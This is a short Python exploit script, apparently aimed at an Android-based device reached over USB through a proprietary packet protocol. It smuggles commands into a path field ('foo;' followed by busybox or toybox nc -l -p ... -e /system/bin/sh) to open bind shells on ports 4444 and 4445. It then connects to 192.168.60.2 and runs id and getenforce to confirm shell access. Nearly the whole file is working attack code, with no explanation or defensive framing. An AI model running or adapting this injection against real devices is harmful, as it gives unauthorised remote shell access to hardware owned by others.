import os
import sys, time, socket
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import n3_file as N

CMDS = [
    'foo;(/system/xbin/busybox nc -l -p 4444 -e /system/bin/sh 2>/dev/null &)',
    'foo;(toybox nc -l -p 4445 -e /system/bin/sh 2>/dev/null &)',
]

d = N.Duml()
d.open()
try:
    for i, path in enumerate(CMDS):
        pay = bytes([0x01, 0x02, 0x00, len(path)]) + path.encode() + b'\x00'
        d.drain(120)
        f = N.pkt(0x0A, 0x5D, 0x8900 + i, 0x19, 0x31, pay, 0x40)
        d.lib.dll.usb_bulk_write(d.h, d.eo, f, len(f), 800)
        out = []

        def on(fr):
            b = N.body_of(fr)
            if not b or len(b) < 7:
                return
            if b[5] == 0x19 and b[6] == 0x31:
                out.append((b[4], b[7:]))
        d.drain(1200, on)
        print('cmd%d reply: %s' % (i, ' | '.join('ack=%02x %s' % (a, p[:20].hex()) for a, p in out) or 'none'))
finally:
    d.close()

time.sleep(1.5)

for port in (4444, 4445):
    print('--- connect %d ---' % port)
    try:
        s = socket.create_connection(('192.168.60.2', port), timeout=5)
        s.settimeout(6)
        s.sendall(b'id; getenforce; getprop sys.usb.config; echo END\n')
        time.sleep(0.8)
        data = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b'END' in data:
                    break
        except socket.timeout:
            pass
        print(data[:800].decode('utf-8', 'replace'))
        s.close()
    except Exception as e:
        print('  ERR', e)
